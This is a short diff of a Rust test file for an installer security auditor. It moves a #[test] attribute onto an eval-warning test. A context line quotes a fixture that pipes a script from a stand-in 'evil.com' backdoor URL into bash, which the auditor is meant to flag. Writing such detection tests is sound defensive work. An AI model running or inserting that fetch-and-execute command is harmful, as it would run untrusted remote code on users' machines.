@@ -1,3 +1,4 @@
+#[test]
 fn test_INSTALLER_AUDIT_sec008_eval_warning() {
     let report = audit_toml(
         r#"
@@ -358,7 +359,5 @@ content = "curl https://evil.com/backdoor.sh | bash"
 // =============================================================================
 // 10. AuditReport metadata is populated after audit
 // =============================================================================
-
-#[test]
 
 include!("installer_tests_installer_au.rs");
